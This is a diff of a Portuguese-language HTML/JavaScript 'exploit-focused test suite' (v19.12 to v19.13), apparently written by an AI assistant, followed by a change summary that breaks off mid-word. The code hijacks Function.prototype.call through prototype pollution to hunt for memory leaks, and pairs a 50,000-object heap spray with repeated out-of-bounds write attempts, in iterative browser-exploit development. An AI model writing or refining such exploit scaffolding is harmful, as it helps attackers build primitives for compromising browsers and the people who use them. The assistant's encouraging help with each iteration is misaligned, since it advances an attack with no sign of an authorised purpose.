@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.12)</title>
+    <title>Suite de Testes Focada em Exploit (v19.13)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -43,29 +43,30 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.12)</h1>
-    <p>Foco: PP Avançada/Gadgets, Combinação de Gadgets PP, Heap Spray + OOB Write Agressivo.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.12)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.13)</h1>
+    <p>Foco: PP Avançada/Gadgets, Hijack Agressivo (call), OOB Write Agressivo.</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.13)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.12) ---
+        // --- Script Focado em Exploit (v19.13) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
         const MEDIUM_PAUSE = 500;
-        const LONG_PAUSE = 1500; // Pausa mais longa para GC/Spray
+        const LONG_PAUSE = 1500;
         let findings = []; // Array único para todos os findings
         let ppGadgetsBroken = {}; // Armazena quais gadgets quebraram
+        let potentialLeakFromHijack = null; // Armazena potencial leak do hijack
 
         const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
         // Função log (v19.9)
         const log = (message, type = 'info', funcName = '') => {
             let keepLog = IMPORTANT_LOG_TYPES.includes(type);
-             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado') || lowerMsg.includes('restaurado') || lowerMsg.includes('não quebrado') || lowerMsg.includes('executada com sucesso') || lowerMsg.includes('nenhum leak encontrado') || lowerMsg.includes('não foi possível analisar') || lowerMsg.includes('não interceptada')) { keepLog = true; } } // Added more 'good' cases
+             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado') || lowerMsg.includes('restaurado') || lowerMsg.includes('não quebrado') || lowerMsg.includes('executada com sucesso') || lowerMsg.includes('nenhum leak encontrado') || lowerMsg.includes('não foi possível analisar')) { keepLog = true; } }
             if (!keepLog) return;
             if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { findings.push({ type, funcName, message: sanitizedMessage, time: timestamp }); } if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
         };
@@ -74,7 +75,14 @@
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
         const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
 
-        // --- Testes Prioritários (v19.12) ---
+        // v19.11: Padrões numéricos a ignorar (unsigned 32-bit)
+        const ignoredNumericPatterns = new Set([
+            0xAAAAAAAA, 0xAAAAAAEE, 0xBBBBBBBB, 0xBBBBBBEE,
+            0xCCCCCCCC, 0xCCCCCCCC, 0xDDDDDDDD, 0xDDDDDDEE, // Corrigido typo
+            0xFFFFFFFF, 0x00000000
+        ]);
+
+        // --- Testes Prioritários (v19.13) ---
 
         // Teste 1: PP Avançada / Gadgets (v19.7 - Armazena estado)
         const testAdvancedPP = async () => {
@@ -90,115 +98,87 @@
             await PAUSE();
         };
 
-        // Teste 2: v19.12: Combinação de Gadgets PP (map + call)
-        const testPPGadgetCombination = async () => {
-            const FNAME = 'testPPGadgetCombination';
-            log("--- Iniciando Teste 2: Combinação de Gadgets PP (map + call) ---", 'test', FNAME);
+        // Teste 2: v19.11: Tentativa de Info Leak via Hijack de Function.call (Análise Refinada)
+        const testPPGadgetLeakAggressive = async () => {
+            const FNAME = 'testPPGadgetLeakAggressive';
+            log("--- Iniciando Teste 2: Tentativa de Info Leak via Hijack (Function.call - Análise Agressiva) ---", 'test', FNAME);
+            potentialLeakFromHijack = null; // Resetar leak
+            let leakFound = false; // Flag local
 
-            // Verificar se ambos os gadgets foram quebrados
-            if (!ppGadgetsBroken['Array.map'] || !ppGadgetsBroken['Function.call']) {
-                let missing = [];
-                if (!ppGadgetsBroken['Array.map']) missing.push('Array.map');
-                if (!ppGadgetsBroken['Function.call']) missing.push('Function.call');
-                log(`Gadget(s) necessários (${missing.join(', ')}) não quebrados no Teste 1. Pulando.`, 'good', FNAME);
-                log("--- Teste 2 Concluído (Pulado) ---", 'test', FNAME);
-                return;
-            }
+            if (!ppGadgetsBroken['Function.call']) { log("Gadget Function.call não quebrado. Pulando.", 'good', FNAME); log("--- Teste 2 Concluído (Pulado) ---", 'test', FNAME); return; }
 
-            const originalMap = Array.prototype.map;
             const originalCall = Function.prototype.call;
-            let mapHijackExecuted = false;
-            let callHijackExecutedViaMap = false;
-            let contextReceivedInCall = null;
+            let hijackExecutedCount = 0;
+            const maxLogs = 20; // Logar mais chamadas
+            const maxDepth = 3; // Profundidade de análise
+
+            // Função auxiliar para análise de objetos
+            const checkObjectForLeak = (obj, prefix = '', depth = 0) => {
+                if (leakFound || !obj || typeof obj !== 'object' || depth > maxDepth) return;
+
+                for (const key in obj) {
+                    if (!Object.prototype.hasOwnProperty.call(obj, key)) continue;
+                    if (['__proto__', 'constructor', 'prototype', 'parentNode', 'ownerDocument', 'window', 'document', 'self'].includes(key)) continue;
+
+                    try {
+                        const value = obj[key];
+                        if (typeof value === 'number' && value > 256 && isFinite(value) && !ignoredNumericPatterns.has(value >>> 0)) {
+                             log(`  -> ${prefix}${key}: Potential numeric leak? ${toHex(value)} (Dec: ${value})`, 'leak', FNAME);
+                             potentialLeakFromHijack = value;
+                             leakFound = true;
+                        } else if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
+                             checkObjectForLeak(value, `${prefix}${key}.`, depth + 1);
+                        }
+                    } catch(e) {}
+                     if (leakFound) return; // Parar se achar
+                }
+            };
 
             try {
-                // Função para sequestrar map
-                const hijackedMapFunction = function(callback, thisArg) {
-                    mapHijackExecuted = true;
-                    log("===> Array.map SEQUESTRADO EXECUTADO! <===", 'vuln', `${FNAME}-Map`);
-                    log(` -> Tentando chamar originalMap...`, 'info', `${FNAME}-Map`);
-                    try {
-                        // Chamar o map original, esperando que ele use .call internamente
-                        return originalMap.call(this, callback, thisArg);
-                    } catch (e) {
-                        log(` -> Erro ao chamar originalMap.call: ${e.message}`, 'warn', `${FNAME}-Map`);
-                        return []; // Retornar array vazio em caso de erro
-                    }
-                };
-
-                // Função para sequestrar call
                 const hijackedCallFunction = function(thisArg, ...args) {
-                     // Logar APENAS se for chamado a partir do map hijackado (ou explicitamente)
-                     // Esta verificação é frágil, depende da pilha de chamadas ou de flags
-                     // Vamos usar uma flag simples para a chamada explícita
-                     if (hijackedCallFunction.calledExplicitly || mapHijackExecuted) {
-                         log(`===> Function.call SEQUESTRADO! (Contexto: ${hijackedCallFunction.calledExplicitly ? 'Explícito' : 'map?'}) <===`, 'vuln', `${FNAME}-Call`);
-                         let thisStr = '[Não foi possível analisar this]';
-                         try { thisStr = this.name || this.toString().substring(0, 80) + '...'; } catch(e){}
-                         log(` -> 'this' (Função Original?): ${thisStr}`, 'info', `${FNAME}-Call`);
-                         if (!hijackedCallFunction.calledExplicitly && mapHijackExecuted) {
-                             callHijackExecutedViaMap = true;
-                             contextReceivedInCall = this; // Salvar o 'this' recebido
-                         }
-                     }
-                     // Resetar flag
-                     hijackedCallFunction.calledExplicitly = false;
-                     // Chamar original (com cuidado)
-                     try {
-                          return originalCall.apply(this, [thisArg, ...args]);
-                     } catch(e) {
-                          log(` -> Erro ao chamar originalCall.apply: ${e.message}`, 'warn', `${FNAME}-Call`);
-                          return undefined;
-                     }
-                };
-                hijackedCallFunction.calledExplicitly = false; // Flag para diferenciar chamadas
+                    hijackExecutedCount++;
+                    if (hijackExecutedCount <= maxLogs || leakFound) {
+                        log(`===> Function.call SEQUESTRADO! Chamada #${hijackExecutedCount} <===`, 'vuln', FNAME);
+                        try {
+                            let thisStr = '[Não foi possível analisar this]'; let thisType = typeof this;
+                            try { thisStr = this.toString().substring(0, 80) + (this.toString().length > 80 ? '...' : ''); thisType = Object.prototype.toString.call(this); } catch(e){}
+                            log(` -> 'this' (Tipo: ${thisType}): ${thisStr}`, 'info', FNAME);
 
-                // Poluir ambos
-                log("Poluindo Array.prototype.map e Function.prototype.call...", 'info', FNAME);
-                Array.prototype.map = hijackedMapFunction;
+                            let thisArgStr = '[Não foi possível analisar thisArg]'; let thisArgType = typeof thisArg;
+                            try { thisArgType = Object.prototype.toString.call(thisArg); thisArgStr = String(thisArg).substring(0, 80) + (String(thisArg).length > 80 ? '...' : '');} catch(e){}
+                            log(` -> 'thisArg' (Tipo: ${thisArgType}): ${thisArgStr}`, 'info', FNAME);
+
+                            if (args && args.length > 0) { log(` -> Outros Args (${args.length}): [${args.map(a => typeof a).join(', ')}]`, 'info', FNAME); }
+
+                            // --- Análise Agressiva ---
+                            if (!leakFound) checkObjectForLeak(this, "'this'.");
+                            if (!leakFound) checkObjectForLeak(thisArg, "'thisArg'.");
+                            if (!leakFound && args) { args.forEach((arg, index) => { if (!leakFound) checkObjectForLeak(arg, `'args[${index}]'.`); }); }
+
+                        } catch (e) { log(` -> Erro dentro da função sequestrada 'call': ${e.message}`, 'error', FNAME); }
+                    }
+                    try { return originalCall.apply(this, [thisArg, ...args]); } catch(e) { if (hijackExecutedCount <= maxLogs) log(` -> Erro ao chamar originalCall.apply: ${e.message}`, 'warn', FNAME); return undefined; }
+                };
+
+                log("Poluindo Function.prototype.call com função controlada...", 'info', FNAME);
                 Function.prototype.call = hijackedCallFunction;
 
-                // Ativar o gadget map, esperando que ele chame o call sequestrado
-                log("Chamando [1, 2].map(x => x)...", 'info', FNAME);
-                try {
-                    [1, 2].map(x => x);
-                    log(` -> Chamada para map concluída.`, 'good', FNAME);
-                } catch (e) {
-                    log(` -> Erro ao chamar map sequestrado: ${e.message}`, 'error', FNAME);
-                }
+                log("Chamando (()=>{}).call(null)...", 'info', FNAME);
+                try { const dummyFunc = () => {}; dummyFunc.call(null); log(` -> Chamada explícita para call concluída.`, 'good', FNAME); } catch (e) { log(` -> Erro ao chamar call sequestrado explicitamente: ${e.message}`, 'error', FNAME); }
 
-                // Chamar call explicitamente para garantir que o hijack funciona
-                log("Chamando (()=>{}).call(null) explicitamente...", 'info', FNAME);
-                 try { const dummyFunc = () => {}; hijackedCallFunction.calledExplicitly = true; dummyFunc.call(null); } catch (e) {}
+                log("Forçando algumas operações internas (podem usar .call)...", 'info', FNAME);
+                try { [1,2,3].forEach(x => x+1); } catch(e){}
+                try { document.body.appendChild(document.createElement('hr')); } catch(e){}
+                try { Object.prototype.hasOwnProperty.call({}, 'a'); } catch(e) {}
 
+                await PAUSE(MEDIUM_PAUSE);
 
-                await PAUSE(MEDIUM_PAUSE); // Dar tempo para logs
+            } catch (e) { log(`Erro fatal durante Teste 2: ${e.message}`, 'error', FNAME); console.error(e); }
+            finally { if (Function.prototype.call !== originalCall) { Function.prototype.call = originalCall; log("Function.prototype.call restaurado.", 'good', 'Cleanup'); } else { log("Function.prototype.call já estava restaurado ou não foi alterado.", 'info', 'Cleanup'); } }
 
-                if (callHijackExecutedViaMap) {
-                    log(`VULN: Hijack de Function.call foi ATIVADO durante a execução do map sequestrado!`, 'vuln', FNAME);
-                    let contextType = typeof contextReceivedInCall;
-                    try { contextType = Object.prototype.toString.call(contextReceivedInCall); } catch(e){}
-                    log(` -> Contexto ('this') recebido em 'call': ${contextType}`, 'info', FNAME);
-                    log(` ---> *** ALERTA: Interação entre Gadgets PP confirmada (map -> call)! ***`, 'escalation', FNAME);
-                } else {
-                    log(`Hijack de Function.call não parece ter sido ativado pela chamada a map.`, 'warn', FNAME);
-                }
-
-            } catch (e) {
-                log(`Erro fatal durante Teste 2: ${e.message}`, 'error', FNAME);
-                console.error(e);
-            } finally {
-                // Restaurar SEMPRE na ordem inversa ou independentemente
-                if (Array.prototype.map !== originalMap) {
-                    Array.prototype.map = originalMap;
-                    log("Array.prototype.map restaurado.", 'good', 'Cleanup');
-                }
-                 if (Function.prototype.call !== originalCall) {
-                    Function.prototype.call = originalCall;
-                    log("Function.prototype.call restaurado.", 'good', 'Cleanup');
-                }
-            }
-            log(`--- Teste 2 Concluído (map hijack: ${mapHijackExecuted}, call via map: ${callHijackExecutedViaMap}) ---`, 'test', FNAME);
+            log(`--- Teste 2 Concluído (Hijack Executado ${hijackExecutedCount} vezes, Leak Encontrado: ${leakFound}) ---`, 'test', FNAME);
+            if (leakFound) { log(` ---> *** ALERTA: Potencial Leak encontrado via Hijack de Function.call! Último valor: ${toHex(potentialLeakFromHijack)} ***`, 'escalation', FNAME); }
+            else { log(`Nenhum leak óbvio encontrado (filtrando padrões, análise agressiva) nas chamadas interceptadas de Function.call.`, 'good', FNAME); }
         };
 
 
@@ -206,114 +186,87 @@
         const testAggressiveOOBWrite = async () => {
             const FNAME = 'testAggressiveOOBWrite';
             log("--- Iniciando Teste 3: Heap Spray + OOB Write Agressivo ---", 'test', FNAME);
-            const sprayCount = 50000; // Spray muito maior
+            const sprayCount = 50000; // Spray massivo
             const controlBufferSize = 64;
-            const allocationSize = controlBufferSize + 128; // Buffer de controle menor é ok
+            const allocationSize = controlBufferSize + 128;
             const baseOffsetInBuffer = 64;
             const oobWriteValue = 0xDEADBEEF;
-            const initialDataValue = 0xAAAAAAAA;
+            const initialDataValueA = 0xAAAAAAAA;
+            const initialDataValueB = 0xBBBBBBBB;
             const sprayedObjects = [];
             let controlBuffer = null;
             let dv = null;
             let oobWriteSuccessCount = 0;
             let hitSuccess = false;
-            const writeAttemptsPerOffset = 5; // Escrever várias vezes no mesmo offset
-
-            // Offsets OOB relativos ao fim do buffer de controle (foco em offsets pequenos)
-            const oobOffsetsToWrite = [4, 8, 12, 16, 20, 24, 28, 32, 48, 64];
+            const writeAttemptsPerOffset = 10; // Aumentar tentativas por offset
+            const oobOffsetsToWrite = [4, 8, 12, 16, 20, 24, 28, 32, 40, 48, 56, 64]; // Mais offsets
 
             try {
-                // --- Heap Spray Agressivo ---
-                log(`Realizando spray AGRESSIVO de ${sprayCount} objetos {id, data}...`, 'info', FNAME);
-                for (let i = 0; i < sprayCount; i++) {
-                    sprayedObjects.push({ id: i, data: initialDataValue });
-                    if (i % 5000 === 0) await PAUSE(1); // Pequena pausa durante spray massivo
-                }
+                log(`Realizando spray AGRESSIVO de ${sprayCount} objetos {id, propA, propB}...`, 'info', FNAME);
+                for (let i = 0; i < sprayCount; i++) { sprayedObjects.push({ id: i, propA: initialDataValueA, propB: initialDataValueB }); if (i % 5000 === 0) await PAUSE(1); }
                 log(`Spray concluído.`, 'info', FNAME);
-                await PAUSE(LONG_PAUSE); // Pausa longa após spray massivo
+                await PAUSE(LONG_PAUSE);
 
-                // --- Alocar Buffer de Controle ---
                 controlBuffer = new ArrayBuffer(allocationSize);
                 dv = new DataView(controlBuffer);
                 for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC);
                 log("Buffer de controle alocado.", 'info', FNAME);
                 await PAUSE(SHORT_PAUSE);
 
-                // --- Tentar Escrita OOB Agressiva ---
                 log(`Tentando escrita OOB (${toHex(oobWriteValue)}) em ${oobOffsetsToWrite.length} offsets, ${writeAttemptsPerOffset}x cada...`, 'info', FNAME);
                 for (const offset of oobOffsetsToWrite) {
                     const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + offset;
                     const relOffsetStr = `ctrlEnd+${offset} (addr ${targetWriteAddr})`;
                     let offsetWriteOk = false;
                     for (let attempt = 0; attempt < writeAttemptsPerOffset; attempt++) {
-                        try {
-                            if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
-                                dv.setUint32(targetWriteAddr, oobWriteValue, true);
-                                oobWriteSuccessCount++;
-                                offsetWriteOk = true;
-                                // Não restaurar aqui, continuar escrevendo no mesmo offset
-                            }
-                        } catch(e) {
-                             // Logar falha apenas uma vez por offset
-                             if (attempt === 0) log(` -> Escrita OOB U32 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`);
-                             offsetWriteOk = false; // Marcar como falha se qualquer tentativa falhar
-                             break; // Parar tentativas neste offset se falhar
-                        }
+                        try { if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, oobWriteValue, true); oobWriteSuccessCount++; offsetWriteOk = true; } } catch(e) { if (attempt === 0) log(` -> Escrita OOB U32 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`); offsetWriteOk = false; break; }
                     }
-                    // Restaurar apenas no final das tentativas para este offset
-                    if(offsetWriteOk && targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength) {
-                         try { dv.setUint32(targetWriteAddr, 0xCCCCCCCC, true); } catch(e){}
-                    }
-                    await PAUSE(1); // Pausa mínima entre offsets
+                    if(offsetWriteOk && targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength) { try { dv.setUint32(targetWriteAddr, 0xCCCCCCCC, true); } catch(e){} }
+                    await PAUSE(1);
                 }
                 log(`Tentativas de escrita OOB concluídas (${oobWriteSuccessCount} escritas realizadas).`, 'info', FNAME);
 
-                // --- Verificação Exaustiva ---
                 if (oobWriteSuccessCount > 0) {
                     log(`Verificando ${sprayCount} objetos do spray por corrupção... (Pode demorar)`, 'info', FNAME);
-                    await PAUSE(LONG_PAUSE); // Pausa longa antes da verificação
+                    await PAUSE(LONG_PAUSE);
                     let hitCount = 0;
                     for(let i = 0; i < sprayCount; i++) {
-                        if (sprayedObjects[i]?.data === oobWriteValue) {
+                        let corruptedProp = null;
+                        if (sprayedObjects[i]?.propA === oobWriteValue) corruptedProp = 'propA';
+                        else if (sprayedObjects[i]?.propB === oobWriteValue) corruptedProp = 'propB';
+
+                        if (corruptedProp) {
                             hitSuccess = true;
                             hitCount++;
-                            log(`---> VULN: Objeto spray ${i} teve 'data' CORROMPIDO para ${toHex(oobWriteValue)}! <---`, 'critical', FNAME);
+                            log(`---> VULN: Objeto spray ${i} teve '${corruptedProp}' CORROMPIDO para ${toHex(oobWriteValue)}! <---`, 'critical', FNAME);
                             log(` ---> *** ALERTA: Primitivo Relevante (OOB Write Controlado sobre Dados do Heap) ***`, 'escalation', FNAME);
+                            // Parar na primeira ocorrência para acelerar
+                            break;
                         }
-                         if (i % 5000 === 0) await PAUSE(1); // Pausa durante verificação
+                         if (i % 5000 === 0) await PAUSE(1);
                     }
-                    if (hitSuccess) {
-                        log(`SUCESSO: ${hitCount} objeto(s) do spray foram atingidos pela escrita OOB!`, 'vuln', FNAME);
-                    } else {
-                        log(`Nenhum objeto do spray parece ter sido atingido pela escrita OOB.`, 'good', FNAME);
-                    }
-                } else {
-                    log("Nenhuma escrita OOB foi realizada, verificação de corrupção pulada.", 'warn', FNAME);
-                }
+                    if (hitSuccess) { log(`SUCESSO: Pelo menos ${hitCount} objeto(s) do spray foram atingidos pela escrita OOB!`, 'vuln', FNAME); }
+                    else { log(`Nenhum objeto do spray parece ter sido atingido pela escrita OOB.`, 'good', FNAME); }
+                } else { log("Nenhuma escrita OOB foi realizada, verificação de corrupção pulada.", 'warn', FNAME); }
 
-            } catch (e) {
-                log(`Erro fatal no Teste 3: ${e.message}`, 'error', FNAME);
-                console.error(e);
-            } finally {
-                sprayedObjects.length = 0; // Limpar spray
-                log(`--- Teste 3 Concluído (OOB Write Hits: ${hitSuccess ? 'Sim' : 'Não'}) ---`, 'test', FNAME);
-            }
+            } catch (e) { log(`Erro fatal no Teste 3: ${e.message}`, 'error', FNAME); console.error(e); }
+            finally { sprayedObjects.length = 0; log(`--- Teste 3 Concluído (OOB Write Hits: ${hitSuccess ? 'Sim' : 'Não'}) ---`, 'test', FNAME); }
             return hitSuccess;
         };
 
 
-        // --- Função Principal de Execução (v19.12) ---
+        // --- Função Principal de Execução (v19.13) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
             if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
             if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.12) ====", 'test', FNAME);
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.13) ====", 'test', FNAME);
 
             await testAdvancedPP(); // Teste 1: Confirmar gadgets PP
             await PAUSE(MEDIUM_PAUSE);
 
-            await testPPGadgetCombination(); // Teste 2: Tentar combinação map+call
+            await testPPGadgetLeakAggressive(); // Teste 2: Tentar leak via hijack de call (análise agressiva)
             await PAUSE(MEDIUM_PAUSE);
 
             await testAggressiveOOBWrite(); // Teste 3: OOB Write Agressivo + Heap Spray
@@ -324,7 +277,7 @@
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                 if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.12) ====", 'test', FNAME);
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.13) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
@@ -333,24 +286,23 @@
 </html>
 ```
 
-**Resumo das Mudanças (v19.12):**
+**Resumo das Mudanças (v19.13):**
 
-1.  **`testAdvancedPP` (Teste 1):** Mantido para confirmar gadgets.
-2.  **Novo Teste: `testPPGadgetCombination` (Teste 2):**
-    * Polui `Array.prototype.map` e `Function.prototype.call` simultaneamente com funções sequestradoras.
-    * Chama `[].map()` e a função que sequestrou `call` regista se foi chamada *durante* a execução de `map`.
-    * Loga se a interação entre os gadgets foi detectada.
-3.  **Novo Teste: `testAggressiveOOBWrite` (Teste 3):**
-    * Realiza um spray massivo (50.000 objetos).
-    * Tenta escritas OOB repetidas (`0xDEADBEEF`) em offsets pequenos (+4 a +64) após o buffer de controlo.
-    * Verifica *todos* os objetos do spray para ver se a propriedade `data` foi corrompida.
-4.  **Testes Removidos:** Testes de Info Leak anteriores e hijack simples foram removidos.
+1.  **`testAdvancedPP` (Teste 1):** Mantido.
+2.  **`testPPGadgetLeakAggressive` (Teste 2):**
+    * Análise dentro do hijack de `call` agora ignora mais padrões numéricos e tem limite de profundidade.
+    * Loga qualquer número > 256 que não seja padrão como `Potential numeric leak?`.
+3.  **`testAggressiveOOBWrite` (Teste 3):**
+    * Spray massivo (50.000 objetos `{id, propA, propB}`).
+    * Escritas OOB (`0xDEADBEEF`) repetidas (10x) em mais offsets (+4 a +64).
+    * Verificação exaustiva dos objetos do spray por corrupção em `propA` ou `propB`.
+4.  **Testes Removidos:** Teste de hijack JSON removido.
 5.  **Ordem e Numeração:** Atualizada.
-6.  **Versionamento:** Atualizado para v19.12.
+6.  **Versionamento:** Atualizado para v19.13.
 
 Execute esta versão. Os pontos chave são:
 
-* **Teste 2:** O log `Hijack de Function.call foi ATIVADO durante a execução do map sequestrado!` indicaria sucesso na combinação de gadgets.
-* **Teste 3:** O log `SUCESSO: X objeto(s) do spray foram atingidos...` indicaria que a escrita OOB cega finalmente funcionou para corromper dados controlados.
+* **Teste 2:** Aparece algum `Potential numeric leak?` nos logs do hijack de `call`?
+* **Teste 3:** Aparece o log `VULN: Objeto spray X teve 'propA/propB' CORROMPIDO...`?
 
-Boa sorte! Este teste pode ser demorado devido ao spray agressi
+Esta é uma tentativa bastante agressiva. Se nenhuma destas abordagens funcionar, será uma forte indicação das limitações da exploração puramente baseada em OOB Write simples e PP neste ambien
